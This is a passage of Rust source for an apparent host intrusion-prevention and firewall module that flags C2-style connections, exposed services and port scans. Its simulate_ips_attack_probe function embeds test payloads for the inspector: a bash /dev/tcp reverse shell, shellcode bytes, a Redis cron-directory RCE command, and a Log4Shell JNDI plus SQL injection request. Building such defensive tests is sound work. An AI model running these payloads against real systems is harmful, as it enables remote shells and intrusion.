        let proc_temp_map: HashMap<u32, bool> = procs
            .iter()
            .map(|p| (p.pid, p.in_temp_or_hidden || p.is_reverse_shell_pattern))
            .collect();

        // 按 PID 聚合并发外联端口数（探测高速端口扫描）
        let mut outbound_targets_by_pid: HashMap<u32, (&str, HashSet<u16>, HashSet<String>)> = HashMap::new();
        for s in sockets {
            if s.pid == self_pid || s.pid <= 1 {
                continue;
            }
            if !s.remote_ip.is_empty()
                && s.remote_ip != "*"
                && !is_loopback_or_trusted_ip(&s.remote_ip, &self.allowlisted_ips)
            {
                let entry = outbound_targets_by_pid
                    .entry(s.pid)
                    .or_insert_with(|| (s.process_name.as_str(), HashSet::new(), HashSet::new()));
                if s.remote_port > 0 {
                    entry.1.insert(s.remote_port);
                }
                entry.2.insert(s.remote_ip.clone());
            }

            // 1) 防火墙规则命中统计
            let _ = self.evaluate_firewall_connection(
                if s.is_wildcard_exposed { FirewallDirection::Inbound } else { FirewallDirection::Outbound },
                FirewallProtocol::Tcp,
                &s.remote_ip,
                if s.remote_port > 0 { s.remote_port } else { s.local_port },
                &s.process_name,
            );

            // 2) C2 可疑外联或高危端口暴露判定
            let proc_suspicious = proc_temp_map.get(&s.pid).copied().unwrap_or(false);
            let is_dangerous_c2_port = matches!(s.remote_port, 4444 | 1337 | 31337);
            let is_high_risk_exposed = s.is_wildcard_exposed
                && matches!(s.local_port, 6379 | 445 | 3389 | 23 | 11211 | 27017 | 9200);

            if (s.is_c2_suspicious || is_dangerous_c2_port || (proc_suspicious && !s.remote_ip.is_empty()))
                && !is_loopback_or_trusted_ip(&s.remote_ip, &self.allowlisted_ips)
            {
                let dedup = format!("C2:{}:{}:{}", s.pid, s.remote_ip, s.remote_port);
                if self.seen_telemetry_keys.insert(dedup) {
                    let ev = self.record_ips_event(
                        s.pid,
                        &s.process_name,
                        &s.local_endpoint,
                        &s.remote_endpoint,
                        &s.remote_ip,
                        s.remote_port,
                        IpsSeverity::Critical,
                        IpsCategory::C2BeaconingChannel,
                        "IPS-BEH-2002",
                        &format!("异常 C2/可疑进程外联 ({})", s.c2_reason),
                        &s.t5b8_hex,
                        s.t5_regime,
                        s.t5b8_recon_error,
                        &format!("socket={} reason={}", s.remote_endpoint, s.c2_reason),
                        true,
                    );
                    new_events.push(ev);
                }
            } else if is_high_risk_exposed {
                let dedup = format!("WILD:{}:{}", s.pid, s.local_port);
                if self.seen_telemetry_keys.insert(dedup) {
                    let ev = self.record_ips_event(
                        s.pid,
                        &s.process_name,
                        &s.local_endpoint,
                        "*:*",
                        "*",
                        s.local_port,
                        IpsSeverity::High,
                        IpsCategory::WildcardServiceExposure,
                        "IPS-EXP-2003",
                        &format!("高危服务对全网段 0.0.0.0:{} 暴露监听", s.local_port),
                        &s.t5b8_hex,
                        s.t5_regime,
                        s.t5b8_recon_error,
                        &format!("LISTEN {} ({})", s.local_endpoint, s.process_name),
                        true,
                    );
                    new_events.push(ev);
                }
            }
        }

        // 3) 多端口高频扫描行为判定 (单 PID 同时连出 >= 8 个不同远端端口，排除主流浏览器正常并发)
        for (pid, (pname, ports, ips)) in outbound_targets_by_pid {
            let lower = pname.to_ascii_lowercase();
            let is_browser = lower.contains("safari")
                || lower.contains("chrome")
                || lower.contains("firefox")
                || lower.contains("edge")
                || lower.contains("arc");
            if !is_browser && ports.len() >= 8 {
                let dedup = format!("SCAN:{}:{}", pid, ports.len());
                if self.seen_telemetry_keys.insert(dedup) {
                    let sample_ip = ips.iter().next().cloned().unwrap_or_else(|| "*".to_string());
                    let sample_port = *ports.iter().next().unwrap_or(&0);
                    let ev = self.record_ips_event(
                        pid,
                        pname,
                        &format!("PID:{}", pid),
                        &format!("{} ({} ports / {} hosts)", sample_ip, ports.len(), ips.len()),
                        &sample_ip,
                        sample_port,
                        IpsSeverity::High,
                        IpsCategory::PortScanSweep,
                        "IPS-BEH-2001",
                        &format!("单进程高频端口扫描/枚举 (并发 {} 端口)", ports.len()),
                        "0xSCAN",
                        200,
                        0.68,
                        &format!("ports_count={} distinct_hosts={}", ports.len(), ips.len()),
                        true,
                    );
                    new_events.push(ev);
                }
            }
        }

        if self.seen_telemetry_keys.len() > 2048 {
            self.seen_telemetry_keys.clear();
        }
        new_events
    }

    /// 内置离线攻防演练探针：安全验证 IPS 与防火墙自动阻断联动，无需对外发包
    pub fn simulate_ips_attack_probe(&mut self, scenario_kind: &str) -> IpsInspectVerdict {
        match scenario_kind {
            "revshell" => self.inspect_payload_ips(
                b"bash -i >& /dev/tcp/198.51.100.44/4444 0>&1; whoami; id\n",
                "curl",
                39102,
                54110,
                "198.51.100.44",
                4444,
                false,
            ),
            "shellcode" => self.inspect_payload_ips(
                &[
                    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d,
                    0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x0f,
                    0x05, 0xcc,
                ],
                "unknown_loader",
                41022,
                51234,
                "203.0.113.77",
                8080,
                false,
            ),
            "redis_rce" => self.inspect_payload_ips(
                b"*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\n",
                "redis-server",
                6379,
                6379,
                "45.155.205.11",
                49112,
                true,
            ),
            "sqli_jndi" => self.inspect_payload_ips(
                b"GET /api/login?q=${jndi:ldap://185.220.101.9/Exploit}' UNION SELECT password FROM users-- HTTP/1.1\r\n",
                "java",
                28812,
                8080,
                "185.220.101.9",
                443,
                false,
            ),
            _ => self.inspect_payload_ips(
                b"POST /v1/systemone HTTP/1.1\r\nHost: 127.0.0.1:9006\r\nContent-Type: application/json\r\n\r\n{\"query\":\"health\",\"ok\":true}",
                "vnb-security-assistant",
                std::process::id(),
                54200,
                "127.0.0.1",
                9006,
                false,
            ),
        }
    }

    /// 导出并同步启用的防火墙规则到 OS 策略文件（可选提权应用到 PF / Windows Defender 防火墙内核）
    pub fn sync_to_os_firewall(
        &mut self,
        apply_to_os_kernel: bool,
        sandbox_export_path: Option<&Path>,
    ) -> Result<String, String> {
        let specs: Vec<FirewallRuleOsSpec> = self
            .rules
            .iter()
            .filter(|r| r.enabled)
            .map(|r| FirewallRuleOsSpec {
                rule_id: r.rule_id.clone(),
                direction: r.direction.code().to_string(),
                protocol: r.protocol.code().to_string(),
                remote_ip: r.remote_ip.clone(),
                port: r.port,
                action: r.action.code().to_string(),
                comment: r.name.clone(),
            })
            .collect();

        let res = platform::sync_os_firewall_rules(&specs, apply_to_os_kernel, sandbox_export_path);
        match &res {
            Ok(msg) => {
                self.last_sync_message = msg.clone();
                if sandbox_export_path.is_none() {
                    self.refresh_os_status(true);
                }
            }
            Err(err) => {
                self.last_sync_message = format!("[FW-SYNC-WARN] {}", err);
            }
        }
        res
    }

    /// 输出结构化摘要用于 `--headless-check` JSON
    pub fn summary_json(&self) -> serde_json::Value {
        serde_json::json!({
            "firewall_enabled": self.firewall_enabled,
            "ips_mode": self.mode.label(),
            "os_backend": self.os_status.backend_name,
            "os_firewall_enabled": self.os_status.os_firewall_enabled,
            "os_profile_detail": self.os_status.stealth_or_profile,
            "total_rules": self.rules.len(),
            "active_rules": self.active_rules_count(),
            "auto_ips_rules": self.auto_ips_rules_count(),
            "ips_events_count": self.ips_events.len(),
            "total_packets_inspected": self.total_packets_inspected,
            "total_packets_blocked": self.total_packets_blocked,
            "allowlisted_ips_count": self.allowlisted_ips.len(),
        })
    }
}

fn t5b8_hex_fallback(r: &T5B8ProtocolCodecResult) -> &str {
    if r.t5b8_hex.is_empty() {
        "0x0000"
    } else {
        &r.t5b8_hex
    }
}
